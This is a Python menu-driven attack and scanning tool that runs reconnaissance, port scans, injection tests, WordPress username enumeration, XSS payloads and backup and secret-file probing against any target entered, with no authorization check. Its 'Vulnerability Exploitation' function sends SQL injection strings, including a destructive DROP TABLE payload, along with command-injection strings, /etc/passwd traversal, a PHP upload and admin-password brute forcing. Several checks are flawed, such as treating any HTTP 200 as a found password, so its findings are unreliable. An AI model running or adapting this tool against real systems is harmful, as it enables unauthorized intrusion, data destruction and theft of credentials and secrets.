import socket
import os
import sys
from datetime import datetime
from dns import resolver
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import subprocess

# Initialize Colorama
init()

# Colors for output
INFO = Fore.CYAN + "[i] " + Style.RESET_ALL
SUCCESS = Fore.GREEN + "[+] " + Style.RESET_ALL
WARNING = Fore.YELLOW + "[!] " + Style.RESET_ALL
ERROR = Fore.RED + "[!] " + Style.RESET_ALL

# Global variables
report_data = []

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    print(Fore.CYAN + """
 $$$$$$\            $$\                            $$$$$$\                                      $$\ $$$$$$$\                      
$$  __$$\           $$ |                          $$  __$$\                                     $$ |$$  __$$\                     
$$ /  \__|$$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$ /  \__|$$\   $$\  $$$$$$\   $$$$$$\   $$$$$$$ |$$ |  $$ | $$$$$$\   $$$$$$\  
$$ |      $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$ |$$$$\ $$ |  $$ | \____$$\ $$  __$$\ $$  __$$ |$$$$$$$  |$$  __$$\ $$  __$$\ 
$$ |      $$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|$$ |\_$$ |$$ |  $$ | $$$$$$$ |$$ |  \__|$$ /  $$ |$$  ____/ $$ |  \__|$$ /  $$ |
$$ |  $$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |      $$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$\ $$ |      \$$$$$$  |\$$$$$$  |\$$$$$$$ |$$ |      \$$$$$$$ |$$ |      $$ |      \$$$$$$  |
 \______/  \____$$ |\_______/  \_______|\__|       \______/  \______/  \_______|\__|       \_______|\__|      \__|       \______/ 
          $$\   $$ |                                                                                                              
          \$$$$$$  |                                                                                                              
           \______/                                                                                                               
    """ + Style.RESET_ALL)


def box_output(title, content):
    """Displays output in a box format."""
    print(Fore.BLUE + "+" + "-" * 50 + "+" + Style.RESET_ALL)
    print(Fore.BLUE + f"| {title.center(48)} |" + Style.RESET_ALL)
    print(Fore.BLUE + "+" + "-" * 50 + "+" + Style.RESET_ALL)
    for line in content.split("\n"):
        print(f"| {line.ljust(48)} |")
    print(Fore.BLUE + "+" + "-" * 50 + "+" + Style.RESET_ALL)

def menu():
    print(Fore.MAGENTA + """
  1. Reconnaissance
  2. Scanning
  3. Vulnerability Exploitation
  4. WordPress Username Enumerator
  5. Sensitive File Detector
  6. WordPress Scanner
  7. XSS Scanner
  8. WordPress Backup Grabber
  9. Reporting
  10. Exit
    """ + Style.RESET_ALL)
    return input(SUCCESS + "Select Option > ")
def append_to_report(section, data):
    """Append findings to the report."""
    global report_data
    report_data.append(f"--- {section} ---\n{data}\n")

def reconnaissance(target):
    print(INFO + "Starting Reconnaissance...")

    try:
        findings = []

        # 1. Subdomain Enumeration
        print(INFO + "Enumerating Subdomains...")
        subdomains = ['www', 'mail', 'ftp', 'test', 'dev', 'api', 'shop', 'blog', 'staging', 'support']
        for sub in subdomains:
            subdomain = f"{sub}.{target}"
            try:
                socket.gethostbyname(subdomain)
                findings.append(subdomain)
            except socket.gaierror:
                pass

        # 2. WHOIS Information
        print(INFO + "Fetching WHOIS Information...")
        try:
            import whois
            whois_data = whois.whois(target)
            findings.append(f"WHOIS: {whois_data}")
        except ImportError:
            findings.append("WHOIS: Install 'whois' library for more details.")
        except Exception:
            findings.append("WHOIS: Failed to fetch details.")

        # 3. DNS Records
        print(INFO + "Fetching DNS Records...")
        record_types = ['A', 'MX', 'NS', 'TXT']
        for record_type in record_types:
            try:
                answers = resolver.resolve(target, record_type)
                findings.append(f"{record_type}: {', '.join(str(r) for r in answers)}")
            except Exception:
                pass

        # 4. HTTP Headers
        print(INFO + "Fetching HTTP Headers...")
        try:
            response = requests.get(f"http://{target}", timeout=5)
            headers = "\n".join([f"{key}: {value}" for key, value in response.headers.items()])
            findings.append(f"HTTP Headers: {headers}")
        except Exception:
            findings.append("HTTP Headers: Failed to fetch.")

        # 5. SSL/TLS Certificate
        print(INFO + "Checking SSL/TLS Certificate...")
        try:
            import ssl
            context = ssl.create_default_context()
            with socket.create_connection((target, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    findings.append(f"SSL/TLS Certificate: {cert}")
        except Exception:
            findings.append("SSL/TLS Certificate: Failed to fetch.")

        # 6. OSINT with Shodan (if available)
        print(INFO + "Fetching Shodan Data...")
        try:
            api_key = "YOUR_SHODAN_API_KEY"  # Replace with your API key
            shodan_url = f"https://api.shodan.io/shodan/host/{target}?key={api_key}"
            response = requests.get(shodan_url).json()
            findings.append(f"Shodan Data: {response}")
        except Exception:
            findings.append("Shodan Data: API not configured or target not found.")

        # 7. Geolocation Data
        print(INFO + "Fetching Geolocation Data...")
        try:
            geo_url = f"http://ip-api.com/json/{target}"
            geo_response = requests.get(geo_url).json()
            findings.append(f"Geolocation: {geo_response}")
        except Exception:
            findings.append("Geolocation: Failed to fetch.")

        # 8. Reverse IP Lookup
        print(INFO + "Performing Reverse IP Lookup...")
        try:
            reverse_ip_url = f"https://api.hackertarget.com/reverseiplookup/?q={target}"
            reverse_ip_response = requests.get(reverse_ip_url).text
            findings.append(f"Reverse IP Lookup: {reverse_ip_response}")
        except Exception:
            findings.append("Reverse IP Lookup: Failed.")

        # 9. HTTP Title Fetch
        print(INFO + "Fetching HTTP Titles...")
        try:
            response = requests.get(f"http://{target}", timeout=5)
            title = BeautifulSoup(response.text, 'html.parser').title.string
            findings.append(f"HTTP Title: {title}")
        except Exception:
            findings.append("HTTP Title: Failed to fetch.")

        # 10. Robots.txt Access
        print(INFO + "Checking for robots.txt...")
        try:
            response = requests.get(f"http://{target}/robots.txt", timeout=5)
            if response.status_code == 200:
                findings.append(f"Robots.txt Content: {response.text.strip()}")
            else:
                findings.append("Robots.txt: Not found.")
        except Exception:
            findings.append("Robots.txt: Failed to fetch.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("Reconnaissance", output)
        append_to_report("Reconnaissance", output)

    except Exception as e:
        print(ERROR + f"Error during reconnaissance: {e}")

def scanning(target):
    print(INFO + "Starting Scanning...")

    try:
        findings = []

        # 1. Basic Port Scan
        print(INFO + "Running Basic Port Scan...")
        open_ports = []
        for port in range(1, 1025):  # Test common ports
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)

        findings.append(f"Open Ports: {', '.join(map(str, open_ports))}")

        # 2. Banner Grabbing
        print(INFO + "Grabbing Banners from Open Ports...")
        for port in open_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((target, port))
                    s.sendall(b"Hello\r\n")
                    banner = s.recv(1024).decode('utf-8').strip()
                    findings.append(f"Port {port}: {banner}")
            except:
                findings.append(f"Port {port}: No banner.")

        # 3. Service Detection
        print(INFO + "Detecting Services on Ports...")
        try:
            nmap_service_result = subprocess.check_output(["nmap", "-sV", target], text=True)
            findings.append(f"Service Detection:\n{nmap_service_result}")
        except Exception:
            findings.append("Service Detection: Failed.")

        # 4. HTTP/S Detection
        print(INFO + "Checking HTTP and HTTPS Services...")
        for port in [80, 443]:
            try:
                url = f"http://{target}:{port}" if port == 80 else f"https://{target}:{port}"
                response = requests.get(url, timeout=5)
                findings.append(f"HTTP/S on Port {port}: {response.status_code} - {response.reason}")
            except Exception:
                findings.append(f"HTTP/S on Port {port}: Not accessible.")

        # 5. SSL/TLS Scan (if HTTPS enabled)
        print(INFO + "Checking SSL/TLS Details...")
        try:
            ssl_result = subprocess.check_output(["sslscan", target], text=True)
            findings.append(f"SSL/TLS Scan:\n{ssl_result}")
        except Exception:
            findings.append("SSL/TLS Scan: Failed or sslscan not installed.")

        # 6. SMB Enumeration
        print(INFO + "Performing SMB Enumeration...")
        try:
            smb_result = subprocess.check_output(["smbclient", "-L", f"//{target}/", "-N"], text=True)
            findings.append(f"SMB Shares:\n{smb_result}")
        except Exception:
            findings.append("SMB Enumeration: Failed or smbclient not installed.")

        # 7. FTP Detection
        print(INFO + "Checking for FTP Services...")
        if 21 in open_ports:
            findings.append("FTP Detected on Port 21.")
        else:
            findings.append("FTP Not Detected.")

        # 8. SNMP Enumeration
        print(INFO + "Performing SNMP Enumeration...")
        try:
            snmp_result = subprocess.check_output(["onesixtyone", target], text=True)
            findings.append(f"SNMP Results:\n{snmp_result}")
        except Exception:
            findings.append("SNMP Enumeration: Failed or onesixtyone not installed.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("Scanning", output)
        append_to_report("Scanning", output)

    except Exception as e:
        print(ERROR + f"Error during scanning: {e}")



def vulnerability_exploitation(target):
    print(INFO + "Starting Vulnerability Exploitation...")

    try:
        findings = []

        # 1. SQL Injection Detection
        print(INFO + "Detecting SQL Injection Vulnerabilities...")
        sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT NULL, NULL--"]
        for payload in sql_payloads:
            url = f"http://{target}/?id={payload}"
            try:
                response = requests.get(url)
                if "SQL syntax" in response.text or "database error" in response.text:
                    findings.append(f"SQL Injection Detected at {url}")
            except:
                pass

        # 2. Command Injection Detection
        print(INFO + "Checking for Command Injection...")
        ci_payloads = ["; ls", "&& whoami", "| uname -a"]
        for payload in ci_payloads:
            url = f"http://{target}/?cmd={payload}"
            try:
                response = requests.get(url)
                if "root" in response.text or "bin" in response.text:
                    findings.append(f"Command Injection Detected at {url}")
            except:
                pass

        # 3. File Inclusion Vulnerabilities
        print(INFO + "Checking for File Inclusion Vulnerabilities...")
        fi_payloads = ["../../../../etc/passwd", "../" * 10 + "etc/passwd"]
        for payload in fi_payloads:
            url = f"http://{target}/?file={payload}"
            try:
                response = requests.get(url)
                if "root:x" in response.text:
                    findings.append(f"File Inclusion Detected at {url}")
            except:
                pass

        # 4. Directory Traversal
        print(INFO + "Detecting Directory Traversal Vulnerabilities...")
        traversal_payloads = ["../../../", "../" * 5]
        for payload in traversal_payloads:
            url = f"http://{target}/{payload}"
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    findings.append(f"Directory Traversal Detected at {url}")
            except:
                pass

        # 5. XSS Payload Testing
        print(INFO + "Injecting XSS Payloads...")
        xss_payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
        for payload in xss_payloads:
            url = f"http://{target}/?search={payload}"
            response = requests.get(url)
            if payload in response.text:
                findings.append(f"XSS Detected at {url}")

        # 6. Password Bruteforce
        print(INFO + "Performing Password Bruteforce on Admin Login...")
        try:
            login_url = f"http://{target}/admin"
            for password in ["admin", "123456", "password"]:
                response = requests.post(login_url, data={"username": "admin", "password": password})
                if "Welcome" in response.text or response.status_code == 200:
                    findings.append(f"Admin Password Found: {password}")
                    break
        except:
            findings.append("Password Bruteforce: Failed to connect.")

        # 7. CMS Detection
        print(INFO + "Detecting CMS...")
        try:
            response = requests.get(f"http://{target}")
            if "wp-content" in response.text:
                findings.append("WordPress CMS Detected")
            elif "Joomla" in response.text:
                findings.append("Joomla CMS Detected")
            elif "Drupal" in response.text:
                findings.append("Drupal CMS Detected")
            else:
                findings.append("CMS Detection: Unknown CMS.")
        except:
            findings.append("CMS Detection: Failed.")

        # 8. Weak SSL/TLS Protocols
        print(INFO + "Scanning for Weak SSL/TLS Protocols...")
        try:
            sslscan_result = subprocess.check_output(["sslscan", target], text=True)
            if "SSLv2" in sslscan_result or "SSLv3" in sslscan_result:
                findings.append("Weak SSL/TLS Protocol Detected")
        except:
            findings.append("SSL Scan: Not available.")

        # 9. Subdomain Takeover
        print(INFO + "Checking for Subdomain Takeover...")
        subdomains = ['blog', 'dev', 'test']
        for sub in subdomains:
            subdomain = f"{sub}.{target}"
            try:
                response = requests.get(f"http://{subdomain}")
                if "404" in response.text or "Not Found" in response.text:
                    findings.append(f"Potential Subdomain Takeover Vulnerability: {subdomain}")
            except:
                pass

        # 10. File Upload Vulnerability
        print(INFO + "Testing for File Upload Vulnerability...")
        try:
            upload_url = f"http://{target}/upload"
            files = {'file': ('test.php', '<?php echo "Vulnerable"; ?>', 'application/x-php')}
            response = requests.post(upload_url, files=files)
            if response.status_code == 200:
                findings.append("File Upload Vulnerability Detected")
        except:
            findings.append("File Upload: Failed to connect.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("Vulnerability Exploitation", output)
        append_to_report("Vulnerability Exploitation", output)

    except Exception as e:
        print(ERROR + f"Error during vulnerability exploitation: {e}")
def wordpress_username_enumerator(target):
    print(INFO + "Starting WordPress Username Enumeration...")

    try:
        findings = []

        # 1. REST API Enumeration
        print(INFO + "Checking REST API for Usernames...")
        url = f"http://{target}/wp-json/wp/v2/users"
        response = requests.get(url)
        if response.status_code == 200:
            users = response.json()
            usernames = [user["name"] for user in users]
            findings.extend(usernames)

        # 2. Enumeration via Author ID
        print(INFO + "Checking Author IDs for Enumeration...")
        for i in range(1, 11):  # Testing 10 authors
            url = f"http://{target}/?author={i}"
            response = requests.get(url)
            if response.status_code == 200 and "author" in response.url:
                findings.append(f"Author {i}: {response.url}")

        # 3. Brute-forcing /xmlrpc.php
        print(INFO + "Brute-forcing Usernames via XML-RPC...")
        try:
            brute_url = f"http://{target}/xmlrpc.php"
            for username in ["admin", "test", "editor"]:
                payload = f"<methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{username}</string></value><value><string>password</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>"
                headers = {"Content-Type": "application/xml"}
                response = requests.post(brute_url, data=payload, headers=headers)
                if "faultCode" not in response.text:
                    findings.append(f"Username Found via XML-RPC: {username}")
        except Exception:
            findings.append("XML-RPC Brute-force Failed.")

        # 4. Extracting Usernames from Comments
        print(INFO + "Extracting Usernames from Comments...")
        try:
            response = requests.get(f"http://{target}")
            soup = BeautifulSoup(response.text, 'html.parser')
            comments = soup.find_all("div", class_="comment-author")
            for comment in comments:
                username = comment.get_text().strip()
                findings.append(f"Comment Username: {username}")
        except:
            findings.append("Comment Extraction: Failed.")

        # 5. Checking Login Page for Default Username
        print(INFO + "Checking Login Page...")
        try:
            login_url = f"http://{target}/wp-login.php"
            response = requests.get(login_url)
            if response.status_code == 200:
                findings.append("Login Page Accessible")
            else:
                findings.append("Login Page Not Found.")
        except:
            findings.append("Login Page Check: Failed.")

        # 6. Username Guessing via Error Messages
        print(INFO + "Guessing Usernames via Error Messages...")
        try:
            response = requests.post(f"http://{target}/wp-login.php", data={"log": "test", "pwd": "wrongpassword"})
            if "Invalid username" in response.text:
                findings.append("Username Guessing Enabled.")
        except:
            findings.append("Username Guessing: Failed.")

        # 7. Extracting Metadata
        print(INFO + "Extracting Metadata for Usernames...")
        try:
            soup = BeautifulSoup(requests.get(f"http://{target}").text, 'html.parser')
            meta_tags = soup.find_all("meta", {"name": "author"})
            for tag in meta_tags:
                findings.append(f"Metadata Username: {tag['content']}")
        except:
            findings.append("Metadata Extraction Failed.")

        # 8. Sitemap Analysis
        print(INFO + "Analyzing Sitemap for Usernames...")
        try:
            sitemap_url = f"http://{target}/sitemap.xml"
            response = requests.get(sitemap_url)
            if response.status_code == 200:
                findings.append("Sitemap Accessible")
            else:
                findings.append("Sitemap Not Found.")
        except:
            findings.append("Sitemap Analysis Failed.")

        # 9. Default Install User Check
        print(INFO + "Checking Default Install User...")
        try:
            url = f"http://{target}/?author=1"
            response = requests.get(url)
            if "author" in response.url:
                findings.append(f"Default Install User: {response.url}")
        except:
            findings.append("Default User Check: Failed.")

        # 10. Reverse Username Guessing via Admin Pages
        print(INFO + "Checking Admin Pages...")
        try:
            response = requests.get(f"http://{target}/wp-admin")
            if response.status_code == 200:
                findings.append("Admin Panel Accessible")
            else:
                findings.append("Admin Panel Not Found.")
        except:
            findings.append("Admin Page Check: Failed.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("WordPress Username Enumerator", output)
        append_to_report("WordPress Username Enumerator", output)

    except Exception as e:
        print(ERROR + f"Error during username enumeration: {e}")
def sensitive_file_detector(target):
    print(INFO + "Starting Sensitive File Detection...")

    try:
        findings = []
        sensitive_files = [
            ".env", "wp-config.php", ".htaccess", "backup.zip", "database.sql", 
            "config.yaml", "log.txt", "error.log", "debug.log", ".git/config",
            "id_rsa", "docker-compose.yml", "web.config", "nginx.conf", "phpinfo.php"
        ]

        for file in sensitive_files:
            url = f"http://{target}/{file}"
            response = requests.get(url)
            if response.status_code == 200:
                findings.append(f"Sensitive File Found: {file}")
            elif response.status_code == 403:
                findings.append(f"Access Restricted to: {file}")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("Sensitive File Detector", output)
        append_to_report("Sensitive File Detector", output)

    except Exception as e:
        print(ERROR + f"Error during sensitive file detection: {e}")
def wordpress_scanner(target):
    print(INFO + "Starting WordPress Scanner...")

    try:
        findings = []

        # 1. Detect WordPress Installation
        print(INFO + "Detecting WordPress Installation...")
        url = f"http://{target}"
        response = requests.get(url)
        if "wp-content" in response.text or "wp-includes" in response.text:
            findings.append("WordPress Installation Detected.")
        else:
            findings.append("WordPress Not Detected.")

        # 2. Plugin Detection
        print(INFO + "Scanning for Vulnerable Plugins...")
        plugins = [
            "revslider", "contact-form-7", "woocommerce", "wpbakery", "akismet",
            "elementor", "yoast-seo", "all-in-one-seo-pack", "wp-smush", "wp-migrate-db"
        ]
        for plugin in plugins:
            plugin_url = f"http://{target}/wp-content/plugins/{plugin}/"
            response = requests.get(plugin_url)
            if response.status_code == 200:
                findings.append(f"Plugin Found: {plugin}")

        # 3. Theme Detection
        print(INFO + "Detecting Themes...")
        themes = ["twentytwenty", "divi", "astra", "oceanwp", "storefront"]
        for theme in themes:
            theme_url = f"http://{target}/wp-content/themes/{theme}/"
            response = requests.get(theme_url)
            if response.status_code == 200:
                findings.append(f"Theme Found: {theme}")

        # 4. WordPress Version Disclosure
        print(INFO + "Checking for Version Disclosure...")
        meta_tag = BeautifulSoup(response.text, 'html.parser').find("meta", {"name": "generator"})
        if meta_tag:
            findings.append(f"WordPress Version: {meta_tag['content']}")
        else:
            findings.append("WordPress Version Disclosure Not Found.")

        # 5. Directory Listing
        print(INFO + "Checking for Directory Listing...")
        dirs = ["wp-content/uploads", "wp-content/plugins"]
        for directory in dirs:
            dir_url = f"http://{target}/{directory}/"
            response = requests.get(dir_url)
            if "Index of" in response.text:
                findings.append(f"Directory Listing Enabled: {directory}")

        # 6. XML-RPC Interface
        print(INFO + "Checking for XML-RPC Interface...")
        xmlrpc_url = f"http://{target}/xmlrpc.php"
        response = requests.get(xmlrpc_url)
        if response.status_code == 200:
            findings.append("XML-RPC Interface Enabled.")

        # 7. Admin Panel Accessibility
        print(INFO + "Checking Admin Panel Accessibility...")
        admin_url = f"http://{target}/wp-admin"
        response = requests.get(admin_url)
        if response.status_code == 200:
            findings.append("Admin Panel Accessible.")

        # 8. Debug Mode Enabled
        print(INFO + "Checking for Debug Mode...")
        debug_url = f"http://{target}/wp-content/debug.log"
        response = requests.get(debug_url)
        if response.status_code == 200:
            findings.append("Debug Mode Enabled.")

        # 9. wp-config.php Backup
        print(INFO + "Checking for wp-config.php Backup...")
        wpconfig_backup = f"http://{target}/wp-config.php.bak"
        response = requests.get(wpconfig_backup)
        if response.status_code == 200:
            findings.append("wp-config.php Backup Found.")

        # 10. Exposed REST API
        print(INFO + "Checking Exposed REST API...")
        rest_url = f"http://{target}/wp-json/wp/v2/"
        response = requests.get(rest_url)
        if response.status_code == 200:
            findings.append("Exposed REST API Found.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("WordPress Scanner", output)
        append_to_report("WordPress Scanner", output)

    except Exception as e:
        print(ERROR + f"Error during WordPress scanning: {e}")
def xss_scanner(target):
    print(INFO + "Starting XSS Vulnerability Scanner...")

    try:
        findings = []
        xss_payloads = [
            '<script>alert(1)</script>', '"><script>alert(1)</script>', '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>', "<body onload=alert(1)>", "';alert(1)//", 
            "><script>alert('XSS')</script>", '<marquee onstart=alert(1)>', 
            "<svg><animate onbegin=alert(1) />", "<iframe src=javascript:alert(1)>"
        ]

        # 1. Testing Query Parameters
        print(INFO + "Injecting Payloads into Query Parameters...")
        for payload in xss_payloads:
            url = f"http://{target}/?search={payload}"
            response = requests.get(url)
            if payload in response.text:
                findings.append(f"XSS Detected in Query Parameter: {url}")

        # 2. Testing Form Fields
        print(INFO + "Testing Payloads in Form Fields...")
        form_url = f"http://{target}/search"
        for payload in xss_payloads:
            try:
                response = requests.post(form_url, data={"input": payload})
                if payload in response.text:
                    findings.append(f"XSS Detected in Form Field: {form_url}")
            except:
                pass

        # 3. Cookie Injection
        print(INFO + "Testing for Cookie Injection...")
        cookie_payload = {'XSS-Test': '<script>alert(1)</script>'}
        response = requests.get(f"http://{target}", cookies=cookie_payload)
        if '<script>alert(1)</script>' in response.text:
            findings.append("XSS Detected via Cookie Injection.")

        # 4. HTTP Headers
        print(INFO + "Testing XSS in HTTP Headers...")
        headers = {'User-Agent': '<script>alert(1)</script>'}
        response = requests.get(f"http://{target}", headers=headers)
        if '<script>alert(1)</script>' in response.text:
            findings.append("XSS Detected via HTTP Headers.")

        # 5. Content Injection in JSON Responses
        print(INFO + "Checking JSON Endpoints for XSS...")
        json_endpoint = f"http://{target}/api/test"
        for payload in xss_payloads:
            try:
                response = requests.post(json_endpoint, json={"test": payload})
                if payload in response.text:
                    findings.append(f"XSS Detected in JSON Response: {json_endpoint}")
            except:
                pass

        # 6. Reflected Parameters
        print(INFO + "Checking Reflected XSS in Parameters...")
        for payload in xss_payloads:
            url = f"http://{target}/test?param={payload}"
            response = requests.get(url)
            if payload in response.text:
                findings.append(f"Reflected XSS Detected: {url}")

        # 7. URL Redirection-Based XSS
        print(INFO + "Testing URL Redirect Parameters...")
        redirect_payload = "javascript:alert(1)"
        redirect_url = f"http://{target}/redirect?next={redirect_payload}"
        response = requests.get(redirect_url)
        if redirect_payload in response.url:
            findings.append(f"Open Redirect Leading to XSS: {redirect_url}")

        # 8. DOM-Based XSS
        print(INFO + "Checking for DOM-Based XSS...")
        try:
            dom_test_url = f"http://{target}/domtest"
            response = requests.get(dom_test_url)
            if "document.write" in response.text or "eval(" in response.text:
                findings.append("Potential DOM-Based XSS Detected.")
        except:
            findings.append("DOM Test Failed.")

        # 9. Testing Vulnerable File Uploads
        print(INFO + "Testing for XSS in File Uploads...")
        try:
            upload_url = f"http://{target}/upload"
            files = {'file': ('xss.html', '<script>alert(1)</script>', 'text/html')}
            response = requests.post(upload_url, files=files)
            if response.status_code == 200:
                findings.append("XSS Payload Uploaded Successfully.")
        except:
            findings.append("File Upload XSS Test Failed.")

        # 10. Browser-Based XSS Simulation
        print(INFO + "Simulating Browser-Based XSS...")
        try:
            response = requests.get(f"http://{target}/simulate_xss")
            if "alert(1)" in response.text:
                findings.append("Simulated XSS Detected.")
        except:
            findings.append("Browser-Based XSS Simulation Failed.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("XSS Scanner", output)
        append_to_report("XSS Scanner", output)

    except Exception as e:
        print(ERROR + f"Error during XSS scanning: {e}")
def wordpress_backup_grabber(target):
    print(INFO + "Starting WordPress Backup Grabber...")

    try:
        findings = []
        backup_paths = [
            "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/wordpress_backup.tar",
            "/site-backup.zip", "/backup.sql", "/backup/database.sql", "/wordpress_backup.tar.gz",
            "/site_backup.sql", "/backup/wordpress_backup.zip"
        ]

        for path in backup_paths:
            url = f"http://{target}{path}"
            response = requests.get(url)
            if response.status_code == 200:
                findings.append(f"Backup Found: {url}")
            elif response.status_code == 403:
                findings.append(f"Restricted Access to Backup: {url}")

        # 11. Checking Public Bucket for Backups
        print(INFO + "Searching Public Cloud Buckets...")
        bucket_url = f"http://{target}-backup.s3.amazonaws.com"
        response = requests.get(bucket_url)
        if response.status_code == 200:
            findings.append("Public Cloud Backup Found.")

        # Display and Report Findings
        output = "\n".join(findings)
        box_output("WordPress Backup Grabber", output)
        append_to_report("WordPress Backup Grabber", output)

    except Exception as e:
        print(ERROR + f"Error during backup grabbing: {e}")
def generate_report():
    print(INFO + "Generating Report...")
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_filename = f"pentest_report_{timestamp}.txt"

    try:
        with open(report_filename, "w") as report_file:
            report_file.write("\n".join(report_data))
        print(SUCCESS + f"Report saved as {report_filename}")
    except Exception as e:
        print(ERROR + f"Error saving report: {e}")
def main():
    clear_screen()
    banner()

    global target
    target = input(SUCCESS + "Enter Target (e.g., example.com or IP) > ")

    while True:
        choice = menu()
        if choice == "1":
            reconnaissance(target)
        elif choice == "2":
            scanning(target)
        elif choice == "3":
            vulnerability_exploitation(target)
        elif choice == "4":
            wordpress_username_enumerator(target)
        elif choice == "5":
            sensitive_file_detector(target)
        elif choice == "6":
            wordpress_scanner(target)
        elif choice == "7":
            xss_scanner(target)
        elif choice == "8":
            wordpress_backup_grabber(target)
        elif choice == "9":
            generate_report()
        elif choice == "10":
            print(SUCCESS + "Exiting...")
            sys.exit()
        else:
            print(ERROR + "Invalid choice. Please try again.")


if __name__ == "__main__":
    main()
